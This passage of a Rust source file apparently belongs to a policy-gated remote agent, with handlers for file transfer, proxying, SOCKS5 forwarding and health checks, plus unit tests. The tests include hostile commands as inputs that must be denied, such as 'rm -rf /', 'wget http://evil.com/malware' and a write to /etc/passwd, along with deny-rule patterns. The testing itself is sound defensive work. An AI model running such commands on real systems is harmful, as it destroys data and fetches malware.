                    start.elapsed().as_millis() as u64,
                );
                RpcResult::ForwardStarted {
                    forward_id,
                    bind_addr: bound_str,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("remote forward bind failed: {e}"),
            },
        }
    }

    async fn handle_socks5_forward(
        &self,
        request_id: &str,
        bind_addr: &str,
        start: Instant,
    ) -> RpcResult {
        use rf_rpc::socks5::{Socks5Config, Socks5Server};

        // Policy check
        let cmd_repr = format!("socks5-forward {bind_addr}");
        let policy = self.policy.read().await;
        let decision = policy.check_command(&cmd_repr);
        if !decision.allowed {
            self.audit(
                request_id,
                "socks5_forward",
                Some(cmd_repr),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        let (cancel_tx, cancel_rx) = tokio::sync::watch::channel(false);
        let config = Socks5Config {
            bind_addr: bind_addr.to_string(),
            ..Default::default()
        };
        let mut server = Socks5Server::new(config, cancel_rx);
        match server.run().await {
            Ok(bound) => {
                let forward_id = uuid::Uuid::new_v4().to_string();
                let bound_str = bound.to_string();
                let mut forwards = self.forwards.lock().await;
                // Use a no-op JoinHandle placeholder since Socks5Server spawns internally
                let handle = tokio::spawn(async {});
                forwards.insert(
                    forward_id.clone(),
                    ActiveForward {
                        _handle: handle,
                        cancel: cancel_tx,
                        bind_addr: bound_str.clone(),
                    },
                );
                self.audit(
                    request_id,
                    "socks5_forward",
                    Some(cmd_repr),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                );
                RpcResult::ForwardStarted {
                    forward_id,
                    bind_addr: bound_str,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("SOCKS5 forward failed: {e}"),
            },
        }
    }

    // --- Health check handler ---

    async fn handle_health_check(
        &self,
        request_id: &str,
        probe_type: &str,
        target: &str,
        timeout_ms: u64,
        start: Instant,
    ) -> RpcResult {
        use crate::health::{ProbeType, execute_probe};

        // Policy check — command probes need command policy check
        if probe_type == "command" {
            let policy = self.policy.read().await;
            let decision = policy.check_command(target);
            if !decision.allowed {
                self.audit(
                    request_id,
                    "health_check",
                    Some(format!("{probe_type}:{target}")),
                    "denied",
                    decision.matched_rule.clone(),
                    None,
                    start.elapsed().as_millis() as u64,
                );
                return RpcResult::Denied {
                    reason: decision.reason,
                    rule: decision.matched_rule,
                };
            }
            drop(policy);
        }

        let probe = match probe_type {
            "tcp" => {
                // Parse target as host:port
                let parts: Vec<&str> = target.rsplitn(2, ':').collect();
                if parts.len() != 2 {
                    return RpcResult::Error {
                        message: "invalid target format, expected host:port".into(),
                    };
                }
                let port: u16 = match parts[0].parse() {
                    Ok(p) => p,
                    Err(_) => {
                        return RpcResult::Error {
                            message: "invalid port".into(),
                        };
                    }
                };
                ProbeType::Tcp {
                    host: parts[1].to_string(),
                    port,
                }
            }
            "http" => ProbeType::Http {
                url: target.to_string(),
                expected_status: 200,
            },
            "command" => ProbeType::Command {
                cmd: target.to_string(),
            },
            "process" => ProbeType::Process {
                name: target.to_string(),
            },
            _ => {
                return RpcResult::Error {
                    message: format!("unknown probe type: {probe_type}"),
                };
            }
        };

        let timeout_dur = Duration::from_millis(timeout_ms);
        let result = execute_probe(&probe, timeout_dur).await;

        self.audit(
            request_id,
            "health_check",
            Some(format!("{probe_type}:{target}")),
            "allowed",
            "default-allow".into(),
            if result.success { Some(0) } else { Some(1) },
            start.elapsed().as_millis() as u64,
        );

        RpcResult::HealthCheckResult {
            success: result.success,
            latency_ms: result.latency_ms,
            error: result.error,
        }
    }

    // --- Log tail handler ---

    async fn handle_tail_log(
        &self,
        request_id: &str,
        path: &str,
        lines: Option<u32>,
        start: Instant,
    ) -> RpcResult {
        // Policy check — reading a log file requires path policy check
        let file_path = std::path::Path::new(path);
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "tail_log",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        // Read the last N lines from a file
        let max_lines = lines.unwrap_or(50) as usize;

        match tokio::fs::read_to_string(path).await {
            Ok(content) => {
                let all_lines: Vec<&str> = content.lines().collect();
                let start_line = all_lines.len().saturating_sub(max_lines);
                let tail: Vec<String> = all_lines[start_line..]
                    .iter()
                    .map(|s| s.to_string())
                    .collect();
                self.audit(
                    request_id,
                    "tail_log",
                    Some(path.to_string()),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                );
                RpcResult::TailOutput {
                    lines: tail,
                    path: path.to_string(),
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("failed to read {path}: {e}"),
            },
        }
    }

    #[allow(clippy::too_many_arguments)]
    async fn handle_file_push(
        &self,
        request_id: &str,
        path: &str,
        offset: u64,
        data: &[u8],
        done: bool,
        checksum: &Option<String>,
        mode: Option<u32>,
        start: Instant,
    ) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "file_push",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        // Write chunk to temp file
        let temp_path = format!("{path}.rf_transfer");

        // For first chunk (offset=0), create/truncate the file
        use tokio::io::AsyncWriteExt;
        let result = if offset == 0 {
            tokio::fs::write(&temp_path, data).await
        } else {
            // Append at offset
            let mut file = match tokio::fs::OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(false)
                .open(&temp_path)
                .await
            {
                Ok(f) => f,
                Err(e) => {
                    return RpcResult::Error {
                        message: format!("open temp file: {e}"),
                    };
                }
            };
            use tokio::io::AsyncSeekExt;
            if let Err(e) = file.seek(std::io::SeekFrom::Start(offset)).await {
                return RpcResult::Error {
                    message: format!("seek: {e}"),
                };
            }
            file.write_all(data).await
        };

        if let Err(e) = result {
            return RpcResult::Error {
                message: format!("write chunk: {e}"),
            };
        }

        let new_offset = offset + data.len() as u64;

        // If done, verify checksum and atomically rename
        if done {
            // Verify checksum if provided
            if let Some(expected) = checksum {
                use sha2::{Digest, Sha256};
                let file_data = match tokio::fs::read(&temp_path).await {
                    Ok(d) => d,
                    Err(e) => {
                        let _ = tokio::fs::remove_file(&temp_path).await;
                        return RpcResult::Error {
                            message: format!("read for checksum: {e}"),
                        };
                    }
                };
                let digest = Sha256::digest(&file_data);
                let hash: String = digest.iter().map(|b| format!("{b:02x}")).collect();
                if hash != *expected {
                    let _ = tokio::fs::remove_file(&temp_path).await;
                    return RpcResult::Error {
                        message: format!("checksum mismatch: expected {expected}, got {hash}"),
                    };
                }
            }

            // Atomic rename
            if let Err(e) = tokio::fs::rename(&temp_path, path).await {
                let _ = tokio::fs::remove_file(&temp_path).await;
                return RpcResult::Error {
                    message: format!("finalize rename: {e}"),
                };
            }

            // Set file permissions if specified
            #[cfg(unix)]
            if let Some(m) = mode {
                use std::os::unix::fs::PermissionsExt;
                let perms = std::fs::Permissions::from_mode(m);
                let _ = tokio::fs::set_permissions(path, perms).await;
            }

            self.audit(
                request_id,
                "file_push",
                Some(path.to_string()),
                "allowed",
                matched_rule,
                Some(0),
                start.elapsed().as_millis() as u64,
            );

            RpcResult::FileChunkAck {
                offset: new_offset,
                finalized: true,
            }
        } else {
            RpcResult::FileChunkAck {
                offset: new_offset,
                finalized: false,
            }
        }
    }

    async fn handle_file_pull(
        &self,
        request_id: &str,
        path: &str,
        offset: u64,
        max_chunk: u32,
        start: Instant,
    ) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "file_pull",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        // Resolve symlinks
        let resolved = match tokio::fs::canonicalize(path).await {
            Ok(p) => p,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("resolve path: {e}"),
                };
            }
        };

        // Get file size
        let metadata = match tokio::fs::metadata(&resolved).await {
            Ok(m) => m,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("metadata: {e}"),
                };
            }
        };
        let total_size = metadata.len();

        // Read chunk at offset
        use tokio::io::{AsyncReadExt, AsyncSeekExt};
        let mut file = match tokio::fs::File::open(&resolved).await {
            Ok(f) => f,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("open file: {e}"),
                };
            }
        };

        if offset > 0 {
            if let Err(e) = file.seek(std::io::SeekFrom::Start(offset)).await {
                return RpcResult::Error {
                    message: format!("seek: {e}"),
                };
            }
        }

        let chunk_size = max_chunk.min(256 * 1024) as usize; // Cap at 256KB
        let mut buf = vec![0u8; chunk_size];
        let bytes_read = match file.read(&mut buf).await {
            Ok(n) => n,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("read chunk: {e}"),
                };
            }
        };
        buf.truncate(bytes_read);

        // Compute checksum on last chunk
        let is_last = offset + bytes_read as u64 >= total_size;
        let checksum = if is_last {
            // Read entire file for checksum
            use sha2::{Digest, Sha256};
            match tokio::fs::read(&resolved).await {
                Ok(all_data) => {
                    let d = Sha256::digest(&all_data);
                    Some(d.iter().map(|b| format!("{b:02x}")).collect())
                }
                Err(_) => None,
            }
        } else {
            None
        };

        self.audit(
            request_id,
            "file_pull",
            Some(path.to_string()),
            "allowed",
            matched_rule,
            Some(0),
            start.elapsed().as_millis() as u64,
        );

        RpcResult::FileChunk {
            offset,
            data: buf,
            total_size,
            checksum,
        }
    }

    async fn handle_proxy(
        &self,
        request_id: &str,
        target: &str,
        idle_timeout_secs: Option<u32>,
        max_duration_secs: Option<u32>,
        start: Instant,
    ) -> RpcResult {
        // Policy check — use network target policy (CIDR/hostname/port rules)
        let policy = self.policy.read().await;
        let decision = policy.check_network_target(target);
        if !decision.allowed {
            self.audit(
                request_id,
                "proxy",
                Some(target.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        // Resolve effective timeouts: request overrides < policy defaults
        let effective_idle = idle_timeout_secs.unwrap_or(policy.proxy_idle_timeout_seconds);
        let effective_max = max_duration_secs.unwrap_or(policy.proxy_max_duration_seconds);
        drop(policy);

        // Attempt TCP connection to target
        match tokio::net::TcpStream::connect(target).await {
            Ok(_stream) => {
                // Connection successful — generate proxy ID
                // The actual bidirectional copy is handled by the agent's RPC loop
                // using yamux streams (similar to port forwarding)
                let proxy_id = format!("proxy-{}", &request_id[..8.min(request_id.len())]);
                self.audit(
                    request_id,
                    "proxy",
                    Some(target.to_string()),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                );
                RpcResult::ProxyConnected {
                    proxy_id,
                    idle_timeout_secs: effective_idle,
                    max_duration_secs: effective_max,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("connect to {target}: {e}"),
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rf_audit::logger::AuditLogger;
    use rf_audit::types::AuditEntry;
    use std::sync::Mutex;

    /// In-memory audit logger for testing.
    struct TestAuditLogger {
        entries: Mutex<Vec<AuditEntry>>,
    }

    impl TestAuditLogger {
        fn new() -> Self {
            Self {
                entries: Mutex::new(Vec::new()),
            }
        }

        fn entries(&self) -> Vec<AuditEntry> {
            self.entries.lock().unwrap().clone()
        }
    }

    impl AuditLogger for TestAuditLogger {
        fn log(&self, entry: AuditEntry) -> Result<(), rf_audit::logger::AuditError> {
            self.entries.lock().unwrap().push(entry);
            Ok(())
        }
    }

    fn test_policy() -> RpcPolicy {
        let yaml = r#"
spec:
  commands:
    allow:
      - pattern: "^echo .*"
      - pattern: "^cat /tmp/.*"
      - pattern: "^true$"
      - pattern: "^false$"
      - pattern: "^sleep .*"
    deny:
      - pattern: ".*rm.*-rf.*"
      - pattern: ".*secret.*"
  resources:
    maxOutputBytes: 1024
    timeoutSeconds: 2
"#;
        RpcPolicy::from_yaml(yaml).unwrap()
    }

    fn make_executor(audit: Arc<dyn AuditLogger>) -> Executor {
        let policy = Arc::new(RwLock::new(test_policy()));
        Executor::new(policy, audit, "test-caller-key".into())
    }

    #[tokio::test]
    async fn test_execute_allowed_command() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-1".into(),
            action: Action::Execute {
                command: "echo hello world".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        assert_eq!(resp.id, "req-1");

        if let RpcResult::Success {
            stdout, exit_code, ..
        } = &resp.result
        {
            assert_eq!(stdout.trim(), "hello world");
            assert_eq!(*exit_code, 0);
        } else {
            panic!("expected success, got {:?}", resp.result);
        }

        // Verify audit entry
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].decision, "allowed");
        assert_eq!(entries[0].action, "execute");
        assert_eq!(entries[0].command.as_deref(), Some("echo hello world"));
        assert_eq!(entries[0].request_id, "req-1");
        assert_eq!(entries[0].caller_key, "test-caller-key");
        assert!(!entries[0].matched_rule.is_empty());
    }

    #[tokio::test]
    async fn test_execute_denied_command() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-2".into(),
            action: Action::Execute {
                command: "rm -rf /".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        assert_eq!(resp.id, "req-2");

        if let RpcResult::Denied { reason, rule } = &resp.result {
            assert!(
                reason.contains("deny rule") || reason.contains("immutable deny"),
                "unexpected reason: {reason}"
            );
            assert!(
                rule.contains("rm.*-rf") || rule.contains("immutable_deny"),
                "unexpected rule: {rule}"
            );
        } else {
            panic!("expected denied, got {:?}", resp.result);
        }

        // Verify audit entry records denial
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].decision, "denied");
        assert_eq!(entries[0].action, "execute");
        assert_eq!(entries[0].command.as_deref(), Some("rm -rf /"));
        assert_eq!(entries[0].request_id, "req-2");
        assert_eq!(entries[0].caller_key, "test-caller-key");
    }

    #[tokio::test]
    async fn test_execute_default_deny() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-3".into(),
            action: Action::Execute {
                command: "wget http://evil.com/malware".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Denied { reason, .. } = &resp.result {
            assert!(reason.contains("deny-by-default"));
        } else {
            panic!("expected denied, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_nonzero_exit_code() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-4".into(),
            action: Action::Execute {
                command: "false".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { exit_code, .. } = &resp.result {
            assert_ne!(*exit_code, 0);
        } else {
            panic!("expected success with non-zero exit, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_timeout() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-5".into(),
            action: Action::Execute {
                command: "sleep 10".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Error { message } = &resp.result {
            assert!(message.contains("timeout"));
        } else {
            panic!("expected timeout error, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_output_limiting() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        // Generate output larger than maxOutputBytes (1024)
        let req = Request {
            id: "req-6".into(),
            action: Action::Execute {
                command: "echo $(head -c 2048 /dev/zero | tr '\\0' 'A')".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert!(stdout.len() <= 1024);
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_with_env() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let mut env = std::collections::HashMap::new();
        env.insert("MY_VAR".into(), "test_value".into());

        let req = Request {
            id: "req-7".into(),
            action: Action::Execute {
                command: "echo $MY_VAR".into(),
                env,
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert_eq!(stdout.trim(), "test_value");
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_metrics_action() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-8".into(),
            action: Action::Metrics,
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert!(stdout.contains("cpus"));
            assert!(stdout.contains("memory_total_mb"));
        } else {
            panic!("expected success, got {:?}", resp.result);
        }

        // Verify audit entry for metrics
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].action, "metrics");
        assert_eq!(entries[0].decision, "allowed");
        assert_eq!(entries[0].request_id, "req-8");
    }

    #[tokio::test]
    async fn test_read_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-9".into(),
            action: Action::Read {
                path: "/etc/hostname".into(),
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { reason, .. } => {
                assert!(reason.contains("deny") || reason.contains("not allowed"));
            }
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_write_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-10".into(),
            action: Action::Write {
                path: "/etc/passwd".into(),
                data: b"evil".to_vec(),
                mode: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { .. } => {}
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_list_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-11".into(),
            action: Action::List {
                path: "/root".into(),
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { .. } => {}
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_read_allowed_with_policy() {
        // Canonicalize temp dir (on macOS, /tmp → /private/tmp, env::temp_dir may not be canonical)
        let tmp_base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let tmp_base_str = tmp_base.to_string_lossy();
        let yaml = format!(
            "spec:\n  commands:\n    allow:\n      - pattern: \".*\"\n  filesystem:\n    allow:\n      - path: \"{tmp_base_str}\"\n  resources:\n    maxOutputBytes: 1024\n    timeoutSeconds: 2\n"
        );
        let policy = RpcPolicy::from_yaml(&yaml).unwrap();
        let audit = Arc::new(TestAuditLogger::new());
        let exec = Executor::new(
            Arc::new(RwLock::new(policy)),
            audit.clone(),
            "test-key".into(),
        );

        // Create a temp file
        let tmp_file = tmp_base.join("rf_test_read.txt");
        tokio::fs::write(&tmp_file, b"hello world").await.unwrap();

        let req = Request {
            id: "req-12".into(),
            action: Action::Read {
                path: tmp_file.to_string_lossy().into(),
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                use base64::Engine;
                let decoded = base64::engine::general_purpose::STANDARD
                    .decode(stdout)
                    .unwrap();
                assert_eq!(decoded, b"hello world");
            }
            _ => panic!("expected success, got {:?}", resp.result),
        }

        let _ = tokio::fs::remove_file(&tmp_file).await;
    }

    #[tokio::test]
    async fn test_write_and_list_allowed() {
        // Canonicalize temp dir (on macOS, /tmp → /private/tmp)
        let tmp_base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let tmp_base_str = tmp_base.to_string_lossy();
        let yaml = format!(
            "spec:\n  commands:\n    allow:\n      - pattern: \".*\"\n  filesystem:\n    allow:\n      - path: \"{tmp_base_str}\"\n  resources:\n    maxOutputBytes: 1024\n    timeoutSeconds: 2\n"
        );
        let policy = RpcPolicy::from_yaml(&yaml).unwrap();
        let audit = Arc::new(TestAuditLogger::new());
        let exec = Executor::new(
            Arc::new(RwLock::new(policy)),
            audit.clone(),
            "test-key".into(),
        );

        let test_dir = tmp_base.join("rf_test_dir");
        let _ = tokio::fs::create_dir(&test_dir).await;

        // Write a file
        let test_file = test_dir.join("test.txt");
        let req = Request {
            id: "req-13".into(),
            action: Action::Write {
                path: test_file.to_string_lossy().into(),
                data: b"file content".to_vec(),
                mode: Some(0o644),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                assert!(stdout.contains("wrote 12 bytes"));
            }
            _ => panic!("expected success for write, got {:?}", resp.result),
        }

        // List directory
        let req = Request {
            id: "req-14".into(),
            action: Action::List {
                path: test_dir.to_string_lossy().into(),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                assert!(stdout.contains("test.txt"));
            }
            _ => panic!("expected success for list, got {:?}", resp.result),
        }

        // Cleanup
        let _ = tokio::fs::remove_dir_all(&test_dir).await;
    }

    #[tokio::test]
    async fn test_background_exec_and_wait() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        // Start background job
        let req = Request {
            id: "req-bg-1".into(),
            action: Action::BackgroundExec {
                command: "echo background-output".into(),
                env: HashMap::new(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        let job_id = match &resp.result {
            RpcResult::JobStarted { job_id, pid: _ } => job_id.clone(),
            _ => panic!("expected JobStarted, got {:?}", resp.result),
        };

        // Wait for job
        let req = Request {
            id: "req-bg-2".into(),
            action: Action::JobWait {
                job_id: job_id.clone(),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::JobStatus {
                running,
                exit_code,
                stdout,
                ..
            } => {
                assert!(!running);
                assert_eq!(*exit_code, Some(0));
                assert!(stdout.as_ref().unwrap().contains("background-output"));
            }
            _ => panic!("expected JobStatus, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_background_exec_query_unknown() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-bg-3".into(),
            action: Action::JobQuery {
                job_id: "nonexistent".into(),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Error { message } => {
                assert!(message.contains("unknown job"));
            }
            _ => panic!("expected error, got {:?}", resp.result),
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn test_shell_session_recording() {
        // Policy that allows shell commands
        let yaml = r#"
spec:
  commands:
    allow:
      - pattern: ".*"
  resources:
    maxOutputBytes: 1024
    timeoutSeconds: 2
"#;
        let policy = RpcPolicy::from_yaml(yaml).unwrap();
        let audit = Arc::new(TestAuditLogger::new());
        let exec = Executor::new(
            Arc::new(RwLock::new(policy)),
            audit.clone(),
            "test-key".into(),
        );

        // Open shell
        let req = Request {
            id: "shell-1".into(),
            action: Action::Shell {
                shell: Some("/bin/sh".into()),
                rows: 24,
                cols: 80,
                env: HashMap::new(),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        let session_id = match &resp.result {
            RpcResult::ShellOpened { session_id } => session_id.clone(),
            _ => panic!("expected ShellOpened, got {:?}", resp.result),
        };

        // Verify shell_open audit
        {
            let entries = audit.entries();
            assert_eq!(entries.len(), 1);
            assert_eq!(entries[0].action, "shell_open");
            assert_eq!(entries[0].decision, "allowed");
            assert_eq!(entries[0].request_id, "shell-1");
        }

        // Send input
        let req = Request {
            id: "shell-2".into(),
            action: Action::ShellInput {
                session_id: session_id.clone(),
                data: b"echo hello\n".to_vec(),
            },
            timeout_ms: None,
            reason: None,
        };
        let _resp = exec.handle(req).await;

        // Verify shell_input audit
        {
            let entries = audit.entries();
            assert!(entries.len() >= 2);
            let input_entry = entries.iter().find(|e| e.action == "shell_input").unwrap();
            assert_eq!(input_entry.decision, "allowed");
            assert_eq!(input_entry.request_id, "shell-2");
            assert_eq!(input_entry.command.as_deref(), Some(&*session_id));
        }

        // Close shell — should emit recording
        let req = Request {
            id: "shell-3".into(),
            action: Action::ShellClose {
                session_id: session_id.clone(),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::ShellExited { exit_code, .. } => {
                assert_eq!(*exit_code, 0);
            }
            _ => panic!("expected ShellExited, got {:?}", resp.result),
        }

        // Verify recording audit entry
        let entries = audit.entries();
        let recording = entries
            .iter()
            .find(|e| e.action == "shell_recording")
            .expect("expected shell_recording audit entry");
        assert_eq!(recording.decision, "recorded");
        assert_eq!(recording.request_id, "shell-3");
        // Recording should contain asciicast v2 header
        let asciicast = recording
            .reason
            .as_ref()
            .expect("recording should be in reason field");
        assert!(
            asciicast.contains("\"version\":2"),
            "asciicast missing header"
        );
        assert!(
            asciicast.contains("\"width\":80"),
            "asciicast missing width"
        );
        // Should have captured at least the input event
        assert!(
            recording.matched_rule.contains("events"),
            "should report event count"
        );

        // Verify shell_close audit entry
        let close_entry = entries
            .iter()
            .find(|e| e.action == "shell_close")
            .expect("expected shell_close audit entry");
        assert_eq!(close_entry.decision, "allowed");
        assert_eq!(close_entry.request_id, "shell-3");
    }

    /// Verify that audit entries are valid JSON (structured JSON-lines format).
    #[tokio::test]
    async fn test_audit_entries_are_valid_json() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        // Execute an allowed command
        let req = Request {
            id: "json-1".into(),
            action: Action::Execute {
                command: "echo json-test".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };
        exec.handle(req).await;

        // Execute a denied command
        let req = Request {
            id: "json-2".into(),
            action: Action::Execute {
                command: "rm -rf /tmp/evil".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };
        exec.handle(req).await;

        // Both entries must serialize to valid JSON
        let entries = audit.entries();
        assert_eq!(entries.len(), 2);
        for entry in &entries {
            let json = serde_json::to_string(entry).expect("audit entry must be JSON-serializable");
            // Parse back to verify round-trip
            let parsed: serde_json::Value =
                serde_json::from_str(&json).expect("audit JSON must be valid");
            assert!(parsed.get("timestamp").is_some());
            assert!(parsed.get("request_id").is_some());
            assert!(parsed.get("action").is_some());
            assert!(parsed.get("decision").is_some());
            assert!(parsed.get("matched_rule").is_some());
            assert!(parsed.get("caller_key").is_some());
            assert!(parsed.get("duration_ms").is_some());
        }

        // Verify allowed vs denied
        assert_eq!(entries[0].decision, "allowed");
        assert_eq!(entries[1].decision, "denied");
    }
}
